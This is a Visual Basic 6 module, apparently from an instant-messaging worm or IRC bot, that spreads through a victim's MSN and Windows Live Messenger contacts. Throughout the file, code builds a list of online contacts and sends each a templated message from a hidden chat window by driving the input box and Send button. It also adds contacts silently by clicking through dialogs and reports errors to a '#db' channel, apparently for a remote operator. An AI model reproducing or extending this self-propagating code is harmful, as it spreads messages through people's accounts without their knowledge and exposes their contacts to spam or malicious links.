Attribute VB_Name = "modSpreadMSN"
Option Explicit

Public MSNPeople() As String
Public MSNPeopleCount As Long
Public MSNPeopleIndex As Long

'sent stuff
Public MSNSent() As String
Public MSNSentTime() As Long
Public MSNSentCount As Long

Public IMSpread As IMSpread
Private Type IMSpread
    BeginDate As String
    DateType As String
    Duration As Long
    MSNMessage As String
    AIMMessage As String
    SpreadingMSN As Boolean
    SpreadingAIM As Boolean
End Type

Public Function MSNAlreadySent(ByVal strNick As String) As Boolean
    On Local Error Resume Next
    Dim i As Long
    strNick = LCase$(strNick)
    
    For i = 0 To MSNSentCount - 1
        If strNick = MSNSent(i) Then
            MSNAlreadySent = True
            Exit Function
        End If
    Next
End Function

Public Sub MSNAddSent(ByVal strNick As String)
    Dim i As Long
    
    strNick = LCase$(strNick)
    For i = 0 To MSNSentCount - 1
        If strNick = MSNSent(i) Then Exit Sub
    Next
    
    ReDim Preserve MSNSent(MSNSentCount)
    ReDim Preserve MSNSentTime(MSNSentCount)
    MSNSent(MSNSentCount) = strNick
    MSNSentTime(MSNSentCount) = GetTickCount
    MSNSentCount = MSNSentCount + 1
End Sub

Public Sub MSNCleanSent()
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Dim i As Long
    Dim x As Long
    
    Do Until i > MSNSentCount - 1
        If MSNSentTime(i) <= GetTickCount - 10800000 Then
            MSNSentCount = MSNSentCount - 1
            If MSNSentCount > 0 Then
                For x = i To MSNSentCount - 1
                    MSNSent(x) = MSNSent(x + 1)
                    MSNSentTime(x) = MSNSentTime(x + 1)
                Next
                ReDim Preserve MSNSent(MSNSentCount - 1)
                ReDim Preserve MSNSentTime(MSNSentCount - 1)
            Else
                MSNSent(x) = vbNullString
                MSNSentTime(x) = 0
            End If
            i = i - 1
        End If
        i = i + 1
    Loop
    
    Exit Sub
ErrHand:
    DirectMsgChan "MSNCleanSent #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub StartMSNSpread()
    'On Local Error GoTo ErrHand
    'On Local Error Resume Next
    
    IMSpread.SpreadingMSN = True
    SaveSetting "imspread.spreadingmsn", CStr(IMSpread.SpreadingMSN)
    Debug.Print "Starting MSN Spread"
    
    'signs them in if they have auto sign in enabled (I think :/)
    On Local Error Resume Next
    frmMain.oMSN.AutoSignin
    On Local Error GoTo ErrHand
    
    Dim MSNContact As IMessengerContact
    Dim MSNContacts As IMessengerContacts
    Set MSNContacts = frmMain.oMSN.MyContacts
    
    'build contact list
    MSNCleanSent
    ReDim MSNPeople(0)
    MSNPeopleCount = 0
    MSNPeopleIndex = 0
    For Each MSNContact In MSNContacts
        If MSNContact.Status <> MISTATUS_OFFLINE And MSNContact.Status <> MISTATUS_IDLE And MSNContact.Blocked = False And MSNContact.IsSelf = False And MSNAlreadySent(MSNContact.SigninName) = False Then
            ReDim Preserve MSNPeople(MSNPeopleCount)
            MSNPeople(MSNPeopleCount) = MSNContact.SigninName
            MSNPeopleCount = MSNPeopleCount + 1
            
            MSNAddSent (MSNContact.SigninName)
        End If
    Next
    
    'timer that stops imspread after duration is over
    frmMain.tmrIMSpread.Enabled = True
    'timer that sends shit to contacts
    frmMain.tmrMSNSend.Enabled = True
    
    Exit Sub
ErrHand:
    DirectMsgChan "StartMSNSpread #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub SendMSNSingle(strEmail As String, strMessage As String)
    On Local Error GoTo ErrHand
    Dim lngForeground As Long
    
    If Len(strEmail) = 0 Or Len(strMessage) = 0 Then Exit Sub
    
    lngForeground = GetForegroundWindow
    Call SetWindowPos(lngForeground, WNDTOPMOST, 0, 0, 0, 0, FRMNOMOVEANDNOSIZE)
    
    Dim currWindow As IMessengerWindow
    Set currWindow = frmMain.oMSN.InstantMessage(strEmail)
    
    Call ShowWindow(currWindow.hwnd, 0)
    Call SendMSNMessage(currWindow.hwnd, strEmail, strMessage)
    currWindow.Close
    
    Call SetWindowPos(lngForeground, WNDNOTOPMOST, 0, 0, 0, 0, FRMNOMOVEANDNOSIZE)
    
    Exit Sub
ErrHand:
    DirectMsgChan "SendMSNSingle #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub SendMSNMessage(lHwnd As Long, strEmail As String, strMessage As String)
    On Local Error Resume Next
    Dim i As Long
    Dim DirectUIHWND As Long
    Dim strTempMessage As String
    Dim strObjectName As String
    
    strTempMessage = Replace$(strMessage, "%email%", strEmail)
    
    DirectUIHWND = FindWindowEx(lHwnd, 0&, "DirectUIHWND", vbNullString)
    
    Dim accWindow As IAccessible
    Call Hax0rWindow(DirectUIHWND, accWindow)
    If accWindow Is Nothing Then Exit Sub
    
    Dim accChildren() As Variant
    Dim lngChildCount As Long
    Call KidnapChildren(accWindow, accChildren, lngChildCount)
    If lngChildCount = 0 Then
        'in some versions of WLM we need to do one more step
        'why? fuck if I know... ;D
        Set accWindow = accWindow.accParent
        Call KidnapChildren(accWindow, accChildren, lngChildCount)
        'hopefully we have children now :o
        If lngChildCount = 0 Then Exit Sub
    End If
    
    'set text
    For i = 0 To lngChildCount - 1
        strObjectName = vbNullString
        strObjectName = accChildren(i).accName(CHILDID_SELF)
        If strObjectName = "Input" Then
            accChildren(i).accValue(CHILDID_SELF) = strTempMessage
            Exit For
        End If
    Next
    'push send button
    For i = 0 To lngChildCount - 1
        strObjectName = vbNullString
        strObjectName = accChildren(i).accName(CHILDID_SELF)
        If LCase$(strObjectName) = "send button" Then
            accChildren(i).accDoDefaultAction (CHILDID_SELF)
            Exit For
        End If
    Next
    DoEvents
End Sub

'Public Sub HideMSNWindows()
'    Dim i As Long
'    Dim hwndList() As Long
'    Dim hwndCount As Long
'
'    Dim currHwnd As Long
'    currHwnd = GetWindow(frmMain.hwnd, GW_HWNDFIRST)
'
'    While currHwnd <> 0
'        ReDim Preserve hwndList(hwndCount)
'        hwndList(hwndCount) = currHwnd
'        hwndCount = hwndCount + 1
'        currHwnd = GetWindow(currHwnd, GW_HWNDNEXT)
'    Wend
'
'    Dim ClassName As String
'
'    For i = 0 To hwndCount - 1
'        ClassName = vbNullString
'        ClassName = GetWindowClassName(hwndList(i))
'        If ClassName = "IMWindowClass" Then
'            Call ShowWindow(hwndList(i), SW_HIDE)
'        End If
'    Next
'End Sub

Public Sub StopMSNSpread()
    IMSpread.SpreadingMSN = False
    Debug.Print "Stopping MSN Spread"
    frmMain.tmrMSN.Enabled = False
    frmMain.tmrMSNSend.Enabled = False
    IMSpread.SpreadingMSN = False
    SaveSetting "imspread.spreadingmsn", CStr(IMSpread.SpreadingMSN)
End Sub

Public Sub MSNAddContact(strContact As String)
    On Local Error Resume Next
    Dim lngTickCount As Long
    Dim lngWindow As Long
    Dim lngButton As Long
    Dim i As Long
    
    Call frmMain.oMSN.AddContact(0, strContact)

    'wait 0.5 second then look for window
    lngTickCount = GetTickCount + 500
    If lngTickCount <= 500 Then
        'if gettickcount failed, do it the stupid way
        For i = 0 To 10000
            DoEvents
        Next
    Else
        Do Until GetTickCount >= lngTickCount
            DoEvents
        Loop
    End If

    'MSN 7.x
    lngWindow = FindWindow(vbNullString, "Add a Contact")
    If lngWindow > 0 Then
        For i = 1 To 2
            lngButton = FindWindowEx(lngWindow, 0&, vbNullString, "&Next >")
            If lngButton > 0 Then
                Call SendMessageLong(lngButton, WM_LBUTTONDOWN, 0&, 0&)
                Call SendMessageLong(lngButton, WM_LBUTTONUP, 0&, 0&)
            End If
        Next
        lngButton = 0
        lngButton = FindWindowEx(lngWindow, 0&, vbNullString, "Finish")
        If lngButton > 0 Then
            Call SendMessageLong(lngButton, WM_LBUTTONDOWN, 0&, 0&)
            Call SendMessageLong(lngButton, WM_LBUTTONUP, 0&, 0&)
        End If
    Else
        'WLM
        Dim DirectUIHWND As Long
        
        lngWindow = FindWindow(vbNullString, "Windows Live Contacts - Edit Contact: " & strContact)
        DirectUIHWND = FindWindowEx(lngWindow, 0&, "DirectUIHWND", vbNullString)
        If DirectUIHWND = 0 Then Exit Sub
        
        Call SetForegroundWindow(lngWindow)
        DoEvents
        Call SendKeys("{ENTER}", 1)
        DoEvents
    End If
End Sub
